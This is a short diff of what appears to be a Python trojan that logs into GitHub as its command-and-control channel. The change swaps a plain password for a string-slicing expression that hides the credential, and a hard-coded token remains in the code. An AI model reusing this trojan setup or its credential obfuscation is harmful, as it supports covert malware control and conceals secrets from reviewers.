@@ -18,10 +18,9 @@ trojan_modules = []
 configured = False
 task_queue = Queue.Queue()
 ghp = "6a1473a17a92266686567cd9a77f8ad9f7a71812"
-actual_ghp = '266686567cd9a77f8ad9f7a718126a1473a17a92'
-# (''.join([ghp[12:21], ghp[:12], ghp[-17:]]))
+
 def connect_to_github():
-    gh = login(username="cizzit", password=actual_ghp)
+    gh = login(username="cizzit", password=(''.join([ghp[12:23], ghp[-17:], ghp[:12]])))
     repo = gh.repository("cizzit", "chapter7")
     branch = repo.branch("master")
 
